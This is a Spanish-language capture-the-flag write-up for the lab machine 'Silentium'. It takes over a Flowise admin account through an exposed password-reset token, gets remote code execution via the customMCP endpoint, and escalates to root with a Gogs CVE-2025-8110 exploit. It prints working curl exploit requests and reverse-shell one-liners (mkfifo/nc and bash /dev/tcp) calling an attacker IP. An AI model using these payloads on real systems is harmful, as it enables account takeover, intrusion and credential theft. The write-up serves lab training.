
# Silentium

<figure><img src="/files/0jYhZpnzV1uzbDABU15u" alt=""><figcaption></figcaption></figure>

## <mark style="color:$primary;">Información General</mark>

* **Nombre de la máquina:** `Silentium`
* **IP:** `10.129.43.138`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `22/04/2026`

***

## <mark style="color:$primary;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.129.43.138 silentium.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -sV -T5 10.129.43.138
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

### Acceso Web

Accedemos a `http://silentium.htb` y observamos que parece ser una calculadora de capital institucional:

<figure><img src="/files/epPIUoUd6RB0Q0CIZWCb" alt=""><figcaption></figcaption></figure>

En principio no encontramos ninguna funcionalidad en la web, ni formularios.

***

## <mark style="color:$primary;">Enumeración Web</mark>

### Fuzzing de Directorios

```bash
gobuster dir -u http://silentium.htb -w /usr/share/wordlists/dirb/common.txt
```

No se encuentran datos sensibles directamente accesibles.

### Análisis de vulnerabilidades

```bash
nuclei -u silentium.htb

   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.10

		projectdiscovery.io

[waf-detect:nginxgeneric] [http] [info] http://silentium.htb
[ssh-server-enumeration] [javascript] [info] silentium.htb:22 ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.15"]
[ssh-password-auth] [javascript] [info] silentium.htb:22
[ssh-sha1-hmac-algo] [javascript] [info] silentium.htb:22
[ssh-auth-methods] [javascript] [info] silentium.htb:22 ["["publickey","password"]"]
[openssh-detect] [tcp] [info] silentium.htb:22 ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.15"]
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://silentium.htb
[http-missing-security-headers:clear-site-data] [http] [info] http://silentium.htb
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://silentium.htb
[http-missing-security-headers:referrer-policy] [http] [info] http://silentium.htb
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://silentium.htb
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://silentium.htb
[http-missing-security-headers:missing-content-type] [http] [info] http://silentium.htb
[http-missing-security-headers:strict-transport-security] [http] [info] http://silentium.htb
[http-missing-security-headers:content-security-policy] [http] [info] http://silentium.htb
[http-missing-security-headers:permissions-policy] [http] [info] http://silentium.htb
[http-missing-security-headers:x-frame-options] [http] [info] http://silentium.htb
[http-missing-security-headers:x-content-type-options] [http] [info] http://silentium.htb
[missing-sri] [http] [info] http://silentium.htb/ ["https://cdn.tailwindcss.com","https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Playfair+Display:wght@700&display=swap"]
[nginx-eol:version] [http] [info] http://silentium.htb ["1.24.0"]
[nginx-version] [http] [info] http://silentium.htb ["nginx/1.24.0"]
[tech-detect:google-font-api] [http] [info] http://silentium.htb
[tech-detect:nginx] [http] [info] http://silentium.htb
[caa-fingerprint] [dns] [info] silentium.htb
[INF] Scan completed in 2m. 24 matches found.
```

No se encuentran vulnerabilidades a simple vista.

***

## <mark style="color:$primary;">Enumeración de Subdominios (VHosts)</mark>

#### Comprobación de Content-Length

```bash
curl -s -I http://10.129.43.138 -H "Host: defnotvalid.silentium.htb" | grep "Content-Length:"
Content-Length: 178
```

#### Fuzzing con FFUF

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://10.129.43.138/ -H 'Host: FUZZ.silentium.htb' -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.43.138/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 62ms]
```

**Encontramos el subdominio:** `staging.silentium.htb`

Lo añadimos a `/etc/hosts` y accedemos a un panel de login:

<figure><img src="/files/D9w7HP4IXJWaVH3RZVtM" alt=""><figcaption></figcaption></figure>

### Enumeración

Con whatweb descubrimos que se trata de una instancia de `Flowise AI`, una plataforma de código abierto que permite a los usuarios crear flujos de trabajo LLM personalizados. La versión es visible en el código fuente de la página.

```bash
whatweb -a3 -v http://staging.silentium.htb

WhatWeb report for http://staging.silentium.htb
Status    : 200 OK
Title     : Flowise - Build AI Agents, Visually
IP        : 10.129.43.138
Country   : RESERVED, ZZ

Summary   : HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], Meta-Author[FlowiseAI], nginx[1.24.0], Open-Graph-Protocol[website], Script[module], UncommonHeaders[access-control-allow-credentials]

Detected Plugins:
[ HTML5 ]
	HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	OS           : Ubuntu Linux
	String       : nginx/1.24.0 (Ubuntu) (from server string)

[ Meta-Author ]
	This plugin retrieves the author name from the meta name 
	tag - info: 
	http://www.webmarketingnow.com/tips/meta-tags-uncovered.html
	#author
	String       : FlowiseAI
```

{% hint style="info" %}
Flowise AI expone una API REST completa `/api/v1/`, que incluye endpoints de usuario y autenticación que no requieren una sesión válida.
{% endhint %}

## <mark style="color:$primary;">Flowise Account Takeover via Password Reset</mark>

Al buscar en Google la vulnerabilidad CVE de Flowise, podemos descubrir que el endpoint `/api/v1/account/forgot-password` es accesible sin autenticación. Al proporcionarle un correo electrónico válido, genera un token de restablecimiento temporal y lo devuelve directamente en el cuerpo de la respuesta JSON. Posteriormente, podemos usar este token temporal para restablecer la contraseña del usuario cuando lo deseemos.

#### Fuzzing de usuarios

```bash
ffuf -w /usr/share/seclists/Usernames/Names/names.txt:FUZZ \
  -u http://staging.silentium.htb/api/v1/account/forgot-password \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"FUZZ@silentium.htb"}}' \
  -fr "user not found" \
  -fc 404,500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://staging.silentium.htb/api/v1/account/forgot-password
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"user":{"email":"FUZZ@silentium.htb"}}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404,500
 :: Filter           : Regexp: user not found
________________________________________________

ben                     [Status: 201, Size: 579, Words: 1, Lines: 1, Duration: 357ms]
```

El primer paso es tomar el control de la cuenta de administrador `ben@silentium.htb`.

#### 1. Solicitar un token de restablecimiento de contraseña

No se requiere autenticación. La API devuelve un valor `tempToken` directamente en el cuerpo de la respuesta.

```bash
TEMP_TOKEN=$(curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}' | jq -r '.user.tempToken')

echo "TempToken: $TEMP_TOKEN"
TempToken: lpquvjyViDI2Rb2OMg3IrHk8amVmfEPpOskn3qF2xLfWRhOxACQEmsXgep5aAgfK
```

#### 2. **Restablecer la contraseña de Ben usando el token**

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"user\":{\"email\":\"ben@silentium.htb\",\"tempToken\":\"$TEMP_TOKEN\",\"password\":\"ben123\"}}"
  
{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$3xT5ByiscZCjubvJPyj7FOrcGdlbiFGEzFF/u6EzWvaaavTi3LFP2","tempToken":"","tokenExpiry":null,"status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-22T14:01:01.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
```

La contraseña se cambia correctamente.

#### 4. **Iniciar sesión con la nueva contraseña**

Nos logueamos en la web correctamente y accedemos al dashboard:

<figure><img src="/files/vC98sBK3GR4begM8KfOe" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:$primary;">Explotación</mark>

### RCE autenticado y escape de Docker

Con un Bearer Token válido podemos acceder al endpoint `/api/v1/node-load-method/customMCP`. El valor `mcpServerConfig` se evalúa en el servidor como JavaScript, lo que nos da acceso completo al módulo de Node `child_process`.

Sabemos esto gracias a una búsqueda en Google, donde podemos encontrar esta prueba de concepto de esta RCE (simplemente busqué en Google "Flowise CVE PoC")

{% embed url="<https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p>" %}

Describo paso a paso cómo se logró el RCE o el primer acceso.

#### Abrir listener

Usaré penelope para tener una shell potente (por defecto usa el puerto 4444):

```
penelope
```

#### Preparar el payload

```bash
cat > payload.json << 'EOF'
{ 
  "loadMethod": "listActions", 
  "inputs": { 
    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.25 4444 >/tmp/f');return 1;})()} )" 
  } 
}
EOF
```

#### Ejecutar exploit

{% hint style="info" %}
El Bearer es la API Key que genera la aplicación, la podemos encontrar desde la propia interfaz
{% endhint %}

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer oXB98urdonlSMtKwUD9Y7ahfPWsFLPUaXT4BCaXjfYI" \
  -d @payload.json
  
[{"label":"No Available Actions","name":"error","description":"No available actions, please check your API key and refresh"}]
```

#### Recibimos la shell como root

<figure><img src="/files/UHMIypRQxKJh2faI8QJh" alt=""><figcaption></figcaption></figure>

Somos root dentro de Docker.

### Variables de entorno

Revisando las variables de entorno descubrimos un montón de tokens, contraseñas en plano versiones:

```bash
~ # env
FLOWISE_PASSWORD=<REDACTED>
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=4
PORT=3000
HOME=/root
OLDPWD=/home/node
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
TERM=xterm-256color
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
SHELL=/bin/sh
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/root
SMTP_PASSWORD=<REDACTED>
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
```

Encontramos dos contraseñas que destacan:

```bash
FLOWISE_PASSWORD=<REDACTED>
SMTP_PASSWORD=<REDACTED>
```

***

## <mark style="color:$primary;">Acceso Inicial</mark>

Probamos ambas contraseñas y una de ellas nos sirve para acceder por SSH con el usuario ben:

```bash
ssh ben@silentium.htb
ben@silentium.htb's password:

Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

ben@silentium:~$ whoami
ben
```

***

## <mark style="color:$primary;">User Flag</mark>

```bash
ben@silentium:~$ ls
user.txt
ben@silentium:~$ cat user.txt 
2e1a60bfbea9d17e90fd2da4********
```

***

## <mark style="color:$primary;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No tenemos sudo como el usuario Ben:

```bash
ben@silentium:/home$ sudo -l
[sudo] password for ben: 
Sorry, user ben may not run sudo on silentium.
```

### Versión de SUDO

```bash
ben@silentium:/home$ sudo -V

Sudo version 1.9.15p5
Sudoers policy plugin version 1.9.15p5
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.15p5
Sudoers audit plugin version 1.9.15p5
```

Esta versión de sudo es vulnerable al `CVE-2025-32463`, y encontramos varios PoC para explotarlo.

{% embed url="<https://github.com/kh4sh3i/CVE-2025-32463>" %}

Pero no tenemos gcc en la máquina objetivo, por lo que el exploit falla:

```bash
ben@silentium:/tmp$ chmod +x exploit.sh 
ben@silentium:/tmp$ ./exploit.sh
./exploit.sh: line 23: gcc: command not found
woot!
[sudo] password for ben: 
sudo: you are not permitted to use the -R option with woot
```

### Escalada de privilegios via CVE-2025-8110 (Gogs)

Al enumerar la máquina, encontramos una instancia de Gogs ejecutándose localmente por el puerto 3001:

```bash
ben@silentium:/tmp$ netstat -antpn

Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:1025          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8025          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33165         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -            
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -                   
```

```bash
ben@silentium:/tmp$ ps aux | grep -i gogs
root        1528  0.0  1.6 1812144 68116 ?       Ssl  12:57   0:01 /opt/gogs/gogs/gogs web
ben        68915  0.0  0.0   6544  2340 pts/1    S+   14:48   0:00 grep --color=auto -i gogs
```

Gogs es vulnerable a `CVE-2025-8110` , una vulnerabilidad de ejecución remota de código basada en enlaces simbólicos que permite a un usuario autenticado sobrescribir `.git/config` dentro de cualquier repositorio, inyectando un script arbitrario `sshCommand` que se ejecuta cuando un proceso privilegiado ejecuta `git push`.

También aquí, al darnos cuenta de que nuestras habilidades de hacking dependen cada vez más de las búsquedas en Google, podemos encontrar la siguiente PoC en GitHub:

{% embed url="<https://github.com/zAbuQasem/gogs-CVE-2025-8110>" %}

Cambiando las credenciales por las del usuario que registramos y eliminando la función de registro en la prueba de concepto, podemos obtener una reverse shell.

#### Port Forwarding SSH

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.43.138 -N -f
```

#### Acceso web

Accedemos a `http://127.0.0.1:3001/` y creamos un usuario:

<figure><img src="/files/HXDjNbiSwauJCpLYFbrW" alt=""><figcaption></figcaption></figure>

#### Generar Token

Necesitamos generar un token desde la aplicación para poder usar la API y que el exploit funcione:

<figure><img src="/files/lZzE1DgjMszpKehkzLuL" alt=""><figcaption></figcaption></figure>

En nuestro caso el token generado es: `50bc3f869b03b9da4d17526281eb4cc620096f58`

#### Modificar exploit

Debemos editar el exploit para añadir nuestro usuario que hemos creado:

{% code title="CVE-2025-8110.py" %}

```python
<----SNIP---->
    username = "afsh4ck" 
    password = "afsh4ck" 
    command = f"bash -c 'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1' #" 
    try: 
        login(session, args.url, username, password) 
        token = get_application_token(session, args.url) 
        repo_name = create_malicious_repo(session, args.url, token) 
        git_config = f"""[core] 
<----SNIP---->
```

{% endcode %}

{% hint style="warning" %}
**IMPORTANTE**: Debemos eliminar la función de registro para que el exploit funcione.
{% endhint %}

#### Ejecutar exploit

```bash
python3 CVE-2025-8110.py -u <TARGET_URL> -lh <ATTACKER_IP> -lp <ATTACKER_PORT>
```

```bash
python3 CVE-2025-8110.py -u http://127.0.0.1:3001 -lh 10.10.15.25 -lp 4444
```

<figure><img src="/files/itK5CO7slyghSGARmdtr" alt=""><figcaption></figcaption></figure>

Tenemos una shell como root!

***

## 👑 <mark style="color:$primary;">Root Flag</mark>

```bash
root@silentium:~# pwd
/root
root@silentium:~# ls
gogs-repositories  root.txt
root@silentium:~# cat root.txt 
0d84c89ce3a50b27a54e06c4********
```
